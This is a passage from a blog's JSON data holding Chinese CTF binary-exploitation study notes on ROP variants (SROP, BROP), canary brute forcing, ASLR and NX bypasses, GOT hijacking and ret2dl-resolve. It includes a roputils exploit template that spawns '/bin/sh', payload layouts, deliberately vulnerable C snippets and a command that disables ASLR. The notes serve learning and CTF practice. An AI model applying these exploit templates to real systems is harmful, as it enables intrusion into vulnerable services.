loc_400616\n.text:00000000004005F6                 xor     ebx, ebx\n.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400600\n.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54\u0019j\n.text:0000000000400600                 mov     rdx, r13\n.text:0000000000400603                 mov     rsi, r14\n.text:0000000000400606                 mov     edi, r15d\n.text:0000000000400609                 call    qword ptr [r12+rbx*8]\n.text:000000000040060D                 add     rbx, 1\n.text:0000000000400611                 cmp     rbx, rbp\n.text:0000000000400614                 jnz     short loc_400600\n.text:0000000000400616\n.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34\u0018j\n.text:0000000000400616                 add     rsp, 8\n.text:000000000040061A                 pop     rbx\n.text:000000000040061B                 pop     rbp\n.text:000000000040061C                 pop     r12\n.text:000000000040061E                 pop     r13\n.text:0000000000400620                 pop     r14\n.text:0000000000400622                 pop     r15\n.text:0000000000400624                 retn\n.text:0000000000400624 __libc_csu_init endp\n```\n\n- 最后连续的6个pop，可以用栈溢出控制rbx，rbp，r12，r13，r14，r15\n- 之后从400600开始可以控制到rdi（通过edi），rsi，rdx的值，并call[r12+rbx*8]。\n  通过上面的调用可以控制到三个传递参数的寄存器，并且执行一次call，完成ret2libc。\n\n**JOP**\n\n$ ROPgadget --binary BIN --only \"pop|jmp\"\n\n以jmp结束的一系列指令，原理与普通ROP类似。\n\n**SROP**\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173337625.png\" alt=\"image-20210626173337625\" style=\"zoom:50%;\" />\n\nsignal机制是一套被广泛应用于unix的机制，它通常用于系统在用户态和内核态切换，执行如杀死进程，设置进程定时器等功能。\n\n如图所示，内核向进程发起signal。进程挂起，进入内核（1），内核为进程保存上下文，跳到signal handler，之后又返回内核态，上下文恢复，最后返回最初的进程。\n\n重点在第二步和第三步上，我们可以把signal handler理解为一个特殊的函数，这个函数返回地址是rt_sigreturn，在执行完signal handler，会返回到rt_sigretrun，而rt_sigreturn会将上下文参数恢复。下图是linux系统保存在栈上的上下文信息。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173459882.png\" alt=\"image-20210626173459882\" style=\"zoom:70%;\" />\n\n可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626173550488.png\" alt=\"image-20210626173550488\" style=\"zoom:67%;\" />\n\n**system call chains**\n\n那么此时当rt_sigreturn 执行完毕后，随后就会执行rip指向的syscall()，并且以rax和rdi为参数。明显的，这个函数调用会弹出一个shell，攻击完成。\n\n如果栈上存放的rip指向的地址不仅仅是syscall()而是syscall(),ret的gadget，并且控制栈指针指向另一个Fake Signal Frame，可以生成一系列的signal调用。\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174128518.png\" alt=\"image-20210626174128518\" style=\"zoom:50%;\" />\n\n可以看到，寄存器的值作为上下文信息的一部分被保存在了栈上，而在rt_sigreturn 执行时又会把寄存器的值从栈上复制到寄存器中，从而恢复用户进程挂起之前的状态。其中，内核为用户恢复上下文时不会对栈上的上下文信息进行检查。意即，我们完全可以通过栈溢出伪造一个存储上下文信息的栈，通过rt_sigreturn将栈上的数据放到寄存器中。如下图\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174307723.png\" alt=\"image-20210626174307723\" style=\"zoom:50%;\" />\n\n**BROP (blind rop)**\n\nBROP与其说是rop技巧，更不如说是寻找gadget的技巧，它的特长在于，可以在没有源程序的情况下寻找有效的gadget，是一种适用于远程攻击的rop，针对的是64位系统。\n\n- 攻击条件\n  在前面我们提到了aslr保护，也就是地址随机化保护，在远程服务器中，服务器端的程序进程崩溃之后会自动重新启动。而对于大部分服务器应用来说，崩溃后重启的地址与崩溃前一样，也就是说虽然服务器端开启了额aslr保护，但只会在第一次启动时生效，崩溃后的重启并不会再次启用aslr随机化。当我们遇到这种远程程序的时候，可以反复进行崩溃尝试而不必担心aslr的影响。\n\n**stack reading**\n\n用于绕过canary保护\n\ncanary（金丝雀）\n\n过去由于缺少气体环境的检测工具，煤矿工人会带着金丝雀下矿洞，金丝雀对于周围气体非常敏感，如果金丝雀死亡，则说明有大量的危险气体，这时矿工就会撤离。\n\n在现代操作系统中，canary是一种防止栈溢出的保护机制，在开辟函数栈时，会先在fs块内存中的某个地方读取值并存到栈上，当函数运行到返回之前，会先检查当前栈上的数据与一开始从fs块上读取的值是否相同（通常是一个异或比较），若不同，则认为程序被栈溢出攻击，直接崩溃。狭义的来说，栈上一开始保存的数据，被我们称为canary。需要注意的是，canary的最低一位一般为“/x00”，这是为了防止canary被一些可以打印栈上数据的漏洞泄露。\n\n- 必要条件,崩溃后的重启不会改变canary的值。\n- 开启canary保护时栈上的布局,Buffer|canary|pre ebp|ret\n\n**覆盖canary**\n\n32位系统下canary长度一般为4个字节，64位下则是8个字节。\n\n进行爆破尝试时，如果仅仅是枚举所有可能的数值，则最多需要尝试4294967296（FFFF+1）次，无疑时非常低效的。\n\n- 改进\n  为了提升效率，我们可以采用逐字节爆破的方式，具体见图。对于逐字节爆破，最大尝试次数仅为4*256=1024\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626174745466.png\" alt=\"image-20210626174745466\" style=\"zoom:80%;\" />\n\n**blind**\n\n这里的blind是指没有本地二进制文件或者源码的情况，即只有位于远程服务器端程序。\n\n不同于本地二进制文件或源码，我们可以直接扫描本地内存获取gadget，远程服务器端的程序，我们很难找到有效的gadget。此时我们可以换个思路，先远程dump内存，利用write（）或者puts（）这类的输出函数来实现。\n\n**寻找起write()和puts()参数的gadgets**\n\n这类gadgets一般形式是pop xxx,ret\n\n- trap地址\n            当程序执行到这个地址时，程序会崩溃。这种地址很常见，内存中到处都是这类地址，一个随机跳转的地址总是能引起程序崩溃。\n- stop地址\n            区别于trap地址，当程序执行到这个地址时，程序会被挂起或者无限循环。\n\n**brop gadget**\n\n在libc_csu_init的结尾一段这样的指令\n\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626175012882.png\" alt=\"image-20210626175012882\" style=\"zoom:80%;\" />\n\n可以看到，这段指令的特殊之处在于它是连续6个pop接一个ret。这种结构非常少见，意即我们可以通过寻找这种结构的gadget来找到这段指令。由上图可以看到的是，这段brop gadget虽然只是对rbx，rbx，r12，r13，r14，r15进行pop然后ret，但是通过分析其机器码，若程序从偏移0x7开始执行，指令则变为pop rsi，pop r15，ret。若程序从偏移0x9开始执行，指令则变为pop rdi，ret。所以若找到这段brop gadget，我们便可以通过偏移找到起第一个和第二个函数参数的gadget。\n\n**寻找brop gadget的地址**\n\n下面讲如何用trap地址和stop地址试探brop gadget的地址。我们把payload进行如下构造buffer+canary+rbp+ret+trap\\*6+stop+trap*n。其中，buffer和rbp的值随意填，ret的值从0x400000开始枚举，一般情况下，由于我们是枚举地址，程序会崩溃。当程序并没有崩溃而是挂起，即无限循环时，记下此时的ret的值。枚举结束后，得到若干ret的值，这里需要注意，得到的ret值有可能不是brop gadget的地址而刚好是另一个stop地址。\n\n如果是stop地址，把ret后所有地址都设为trap地址，若仍然会导致程序挂起，则确认是stop地址。\n\n**第三个参数的gadget**\n\n- 对于puts()，此时的gadgets其实已经足够，但是对于write(),仍然需要一个起参数的gadget。\n- pop rdx,ret难以寻找，用strcmp()代替。 \n  strcmp()可以对rdx进行赋值。\n- 最后用puts()或者write()dump内存，寻找更多的gadgets来完成攻击。\n\n \n","slug":"ctfpwn3","published":1,"date":"2021-06-25T13:07:36.273Z","updated":"2021-06-29T05:54:58.683Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9t0008rouv4s3f1x7d","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习日记3</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR</strong></p>\n<p>地址空间配置随机载入（Address Space Layout Randomization，ASLR，又称地址空间配置随机化、地址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。</p>\n<p>地址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。</p>\n<p>传统攻击：</p>\n<ul>\n<li>基础栈溢出：需要定位shellcode</li>\n<li>return-to-libc：     需要libc地址</li>\n</ul>\n<p>开启ASLR后：libc基址不再固定，shellcode的地址（栈、bss等地址）在每一次运行时也相应地发生改变，传统的地址硬编码的攻击基本失效。</p>\n<table>\n<thead>\n<tr>\n<th><strong>Aspect</strong></th>\n<th><strong>aslr</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>表现</td>\n<td>优异-每次加载都会随机</td>\n</tr>\n<tr>\n<td>发布</td>\n<td>获得内核支持，不需要重新编译</td>\n</tr>\n<tr>\n<td>兼容性</td>\n<td>对安全应用程序透明（位置独立）</td>\n</tr>\n<tr>\n<td>保护效果</td>\n<td>64位下效果显著</td>\n</tr>\n</tbody></table>\n<p>查看当前ASLR状态：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> cat /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure>\n\n<p> 2</p>\n<p>该值为：</p>\n<ul>\n<li>1: 随机化堆栈，VDSO，共享内存区域的位置</li>\n<li>2: 同上，并添加数据段的随机</li>\n<li>0: 禁用ASLR</li>\n</ul>\n<p>linux关闭ASLR:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">echo</span> 0 &gt;&gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass</strong></p>\n<ul>\n<li><p>leak address</p>\n</li>\n<li><p>暴力破解</p>\n</li>\n<li><p>非随机化内存</p>\n</li>\n<li><p>ret2text</p>\n</li>\n<li><p>函数指针</p>\n</li>\n<li><p>GOT表劫持（不依赖libc空间）</p>\n</li>\n<li><p>rewrite GOT[]</p>\n</li>\n<li><p>ret2dl-resolve</p>\n</li>\n<li><p>栈juggling</p>\n</li>\n<li><p>ret2ret</p>\n</li>\n<li><p>ret2pop</p>\n</li>\n<li><p>ret2eax</p>\n</li>\n</ul>\n<p><strong>ASLR Bypass之leak address</strong></p>\n<p>开启ASLR后无法通过控制eip来直接输出地址。</p>\n<p>但是可以通过覆盖相关数据来间接地泄露地址。</p>\n<p>如：</p>\n<ul>\n<li>输出内容中是否有地址信息</li>\n<li>如：精心设计的输出、未初始化的变量等</li>\n<li>覆盖输出函数的指针</li>\n<li>如：覆盖printf()的参数</li>\n<li>覆盖输出的缓冲区大小</li>\n<li>如：覆盖write(),memcpy()的参数</li>\n</ul>\n<p><strong>ASLR Bypass之暴力绕过</strong></p>\n<ul>\n<li>使用大量NOP填充shellcode，提高地址命中率，并暴力搜索栈的地址<pre><code>      payload： nop*n + shellcode\n</code></pre>\n</li>\n</ul>\n<h3 id=\"ASLR-Bypass之非随机化内存\"><a href=\"#ASLR-Bypass之非随机化内存\" class=\"headerlink\" title=\"ASLR Bypass之非随机化内存\"></a><strong>ASLR Bypass之非随机化内存</strong></h3><p>ret2text</p>\n<p>text段有可以执行的程序代码，并且地址不会被除PIE之外的ASLR随机化,可以将程序执行流劫持到意外的（但已经存在）的程序函数</p>\n<p><strong>函数指针劫持</strong></p>\n<p>覆盖一个函数指针指向：</p>\n<ul>\n<li>程序函数</li>\n<li>程序连接表中的其他库函数</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">secret</span><span class=\"params\">(<span class=\"keyword\">char</span> *input)</span></span>&#123;... &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">chk_pwd</span><span class=\"params\">(<span class=\"keyword\">char</span> *input)</span></span>&#123;... &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">int</span> (*ptr)(<span class=\"keyword\">char</span> *input);</span><br><span class=\"line\"><span class=\"keyword\">char</span> buf[<span class=\"number\">8</span>];</span><br><span class=\"line\">ptr = &amp;chk_pwd;</span><br><span class=\"line\"><span class=\"built_in\">strncpy</span>(buf,argv[<span class=\"number\">1</span>],<span class=\"number\">12</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello %s!\\n&quot;</span>,buf);</span><br><span class=\"line\">(*ptr)(argv[<span class=\"number\">2</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass之GOT劫持</strong></p>\n<ul>\n<li>第一次运行函数<br>函数先跳转到plt表，从plt表跳转到got表，got表中存储的是该函数在plt表中的地址+4偏移，于是又跳转到plt下，执行push     xx，jmp &lt;got [0]&gt;，其中push是给检索函数提供参数，jmp到got表的检索函数，此时got表中就会填充函数的准确地址</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;hello world\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; disass main</span><br><span class=\"line\">Dump of assembler code for function main:</span><br><span class=\"line\">0x0000000000400526 &lt;+0&gt;:\tpush   rbp</span><br><span class=\"line\">0x0000000000400527 &lt;+1&gt;:\tmov    rbp,rsp</span><br><span class=\"line\">0x000000000040052a &lt;+4&gt;:\tmov    edi,0x4005c4</span><br><span class=\"line\">0x000000000040052f &lt;+9&gt;:\tcall   0x400400 &lt;puts@plt&gt;</span><br><span class=\"line\">0x0000000000400534 &lt;+14&gt;:\tmov    eax,0x0</span><br><span class=\"line\">0x0000000000400539 &lt;+19&gt;:\tpop    rbp</span><br><span class=\"line\">0x000000000040053a &lt;+20&gt;:\tret</span><br><span class=\"line\">End of assembler dump.</span><br><span class=\"line\">pwndbg&gt; disass *0x400400</span><br><span class=\"line\">No function contains specified address.</span><br><span class=\"line\">pwndbg&gt; disass 0x400400</span><br><span class=\"line\">Dump of assembler code for function puts@plt:</span><br><span class=\"line\">0x0000000000400400 &lt;+0&gt;:\tjmp    QWORD PTR [rip+0x200c12]        # 0x601018</span><br><span class=\"line\">0x0000000000400406 &lt;+6&gt;:\tpush   0x0</span><br><span class=\"line\">0x000000000040040b &lt;+11&gt;:\tjmp    0x4003f0</span><br><span class=\"line\">End of assembler dump.</span><br><span class=\"line\">pwndbg&gt; x 0x601018</span><br><span class=\"line\">0x601018:\t0x00400406</span><br></pre></td></tr></table></figure>\n\n<p><strong>改写GOT表项</strong></p>\n<ul>\n<li>GOT中存储的是函数在内存中的真实地址</li>\n<li>利用方法</li>\n<li>覆盖got表中的地址，当程序运行某一个函数，实际执行的是另一个我们覆盖的函数。</li>\n<li>e.g.:覆盖printf()为system()</li>\n</ul>\n<p><strong>ret2dl-resolve（32位为例）</strong></p>\n<p>elf.h:</p>\n<p>#define reloc_offset reloc_arg</p>\n<ul>\n<li>计算重定位条目基址 Elf32_Rel  * reloc = JMPREL + reloc_offset;</li>\n<li>计算符号表条目基址 Elf32_Sym  * sym = &amp;SYMTAB[ ELF32_R_SYM (reloc-&gt;r_info) ];</li>\n<li>获得符号名称 const char  *symname = strtab + sym-&gt;st_name;</li>\n<li>通过符号名称symname搜索动态库，将地址填入function@got（即&amp;GOT+reloc_offset）</li>\n<li>调整堆栈，执行function</li>\n</ul>\n<p>可通过伪造两个相关的数据结构：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  Elf32_Addr    r_offset;       <span class=\"comment\">/* Address */</span></span><br><span class=\"line\">  Elf32_Word    r_info;         <span class=\"comment\">/* Relocation type and symbol index */</span></span><br><span class=\"line\">&#125; Elf32_Rel;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  Elf32_Word    st_name;        <span class=\"comment\">/* Symbol name (string tbl index) */</span></span><br><span class=\"line\">  Elf32_Addr    st_value;       <span class=\"comment\">/* Symbol value */</span></span><br><span class=\"line\">  Elf32_Word    st_size;        <span class=\"comment\">/* Symbol size */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> st_info;        <span class=\"comment\">/* Symbol type and binding */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">char</span> st_other;       <span class=\"comment\">/* Symbol visibility */</span></span><br><span class=\"line\">  Elf32_Section st_shndx;       <span class=\"comment\">/* Section index */</span></span><br><span class=\"line\">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>\n\n<p>控制reloc_offset的数值，使const char *symname指向伪造的数据结构中的函数名。最后在function@got即&amp;GOT+reloc_offset中填入我们伪造的symname（如system）函数的真实地址。</p>\n<p><strong>ret2dl-resolve自动利用工具roputils</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#现成32位模板：</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> roputils <span class=\"keyword\">import</span> *</span><br><span class=\"line\">fpath = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">offset = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">rop = ROP(fpath)</span><br><span class=\"line\">addr_bss = rop.section(<span class=\"string\">&#x27;.bss&#x27;</span>)</span><br><span class=\"line\">buf = rop.retfill(offset)</span><br><span class=\"line\">buf += rop.call(<span class=\"string\">&#x27;read&#x27;</span>, <span class=\"number\">0</span>, addr_bss, <span class=\"number\">100</span>)</span><br><span class=\"line\">buf += rop.dl_resolve_call(addr_bss+<span class=\"number\">20</span>, addr_bss)</span><br><span class=\"line\">p = Proc(rop.fpath)</span><br><span class=\"line\">p.write(p32(<span class=\"built_in\">len</span>(buf)) + buf)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;[+] read: %r&quot;</span> % p.read(<span class=\"built_in\">len</span>(buf))</span><br><span class=\"line\">buf = rop.string(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">20</span>, buf)</span><br><span class=\"line\">buf += rop.dl_resolve_data(addr_bss+<span class=\"number\">20</span>, <span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">buf += rop.fill(<span class=\"number\">100</span>, buf)</span><br><span class=\"line\">p.write(buf)</span><br><span class=\"line\">p.interact(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass之GOT劫持</strong></p>\n<p>当不能直接利用roputils时需要手动伪造两个数据结构、计算偏移和填充大小。</p>\n<p><strong>ASLR Bypass之ret2eax</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">msglog</span><span class=\"params\">(<span class=\"keyword\">char</span> *input)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">64</span>];</span><br><span class=\"line\">    <span class=\"built_in\">strcpy</span>(buf, input);      <span class=\"comment\">//&lt;---------返回值是一个存储在eax的指向buf的指针</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;exploitme &lt;msg&gt;\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">msglog(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>随后，调用*eax就会把程序控制流劫持到buf上</p>\n<p><strong>ASLR Bypass之ret2ret</strong></p>\n<p>如果栈上有一个函数指针需要被执行，可以考虑这个ret = pop eip；jmp eip；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">f</span><span class=\"params\">(<span class=\"keyword\">char</span> *str)</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">char</span> buffer[<span class=\"number\">256</span>];</span><br><span class=\"line\">   <span class=\"built_in\">strcpy</span>(buffer, str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">int</span> no = <span class=\"number\">1</span>;</span><br><span class=\"line\">   <span class=\"keyword\">int</span> *ptr = &amp;no;</span><br><span class=\"line\">   f(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR Bypass之ret2pop</strong></p>\n<p>返回到一个地址，执行的命令为pop xxx,ret，在栈上布置要返回的函数和参数。</p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210626171343899.png\" alt=\"image-20210626171343899\" style=\"zoom:50%;\" />\n\n<h3 id=\"NX-DEP\"><a href=\"#NX-DEP\" class=\"headerlink\" title=\"NX/DEP\"></a><strong>NX/DEP</strong></h3><p>NX/DEP保护，即数据段不可执行保护，是针对栈溢出攻击而产生的一项防护措施。简单的来说，当开启这种保护时，堆栈上的指令将没有执行权限。所以，将shellcode写到栈上的简单的栈溢出攻击将会失效。</p>\n<p> <strong>DEP绕过之ret2libc</strong></p>\n<p>不利用自己注入的代码，而用系统已有的代码来构造攻击</p>\n<p>system(“/bin/sh”)</p>\n<ul>\n<li><p>特点</p>\n</li>\n<li><ul>\n<li>通常指向系统共享库的代码 —&gt;执行不受NX/DEP影响</li>\n</ul>\n</li>\n<li><p>溢出形式</p>\n<pre><code>      buffer + system()的地址 + ret + binsh_addr\n      system()的地址即系统共享库中system()的地址。\n      这里ret的值是执行玩system()后的返回地址，并不重要，可以为任意值。p64(0)\n      binsh_addr()作为system()的参数，调用后拉起shell。\n</code></pre>\n</li>\n</ul>\n<p><strong>如果有ASLR保护？</strong></p>\n<p>地址空间配置随机载入（英语：Address space layout randomization，缩写ASLR，又称位址空间配置随机化、位址空间布局随机化）是一种防范内存损坏漏洞被利用的计算机安全技术。位址空间配置随机载入利用随机方式配置资料定址空间，使某些敏感资料（例如作业系统内核）配置到一个恶意程式无法事先获知的位址，令攻击者难以进行攻击。（维基百科）</p>\n<p>即使开启地址随机化，也不是全随机的。对于linux来说，开启ASLR，libc的基地址在每一次启动时都会变化，但是libc本身是整块存入内存的。即libc中指令相对于其基地址的偏移是不会变化的。而libc本身的指令是足够getshell的，所以要对抗ASLR，可以从泄露libc基地址下手。</p>\n<p><strong>影响</strong></p>\n<ul>\n<li>libc基地址变动</li>\n<li>gadgets的地址难以确认。<pre><code>      ldd 查看libc地址，发现每一次都有变动。\n</code></pre>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Documents/pwnkr/bof $ ldd bof</span><br><span class=\"line\">\tlinux-gate.so.1 =&gt;  (0xf7777000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7599000)</span><br><span class=\"line\">\t/lib/ld-linux.so.2 (0x5662b000)</span><br><span class=\"line\">~/Documents/pwnkr/bof $ ldd bof</span><br><span class=\"line\">\tlinux-gate.so.1 =&gt;  (0xf7720000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7542000)</span><br><span class=\"line\">~/Documents/pwnkr/bof $ ldd bof</span><br><span class=\"line\">\tlinux-gate.so.1 =&gt;  (0xf775d000)</span><br><span class=\"line\">\tlibc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf757f000)</span><br><span class=\"line\">\t/lib/ld-linux.so.2 (0x565c1000)</span><br></pre></td></tr></table></figure>\n\n<p><strong>ASLR应对方法</strong></p>\n<ul>\n<li><p>泄露libc地址</p>\n</li>\n<li><p>for example </p>\n</li>\n<li><ul>\n<li>用write(1,got.write(),4)打印write()函数的实际地址，通过偏移来算libc.so的基地址，进而算出system()的真实地址。</li>\n<li>libc_addr=write_addr - write_offset</li>\n<li>system_addr=libc_addr + system_offset</li>\n</ul>\n</li>\n</ul>\n<p><strong>Memory Leak &amp; 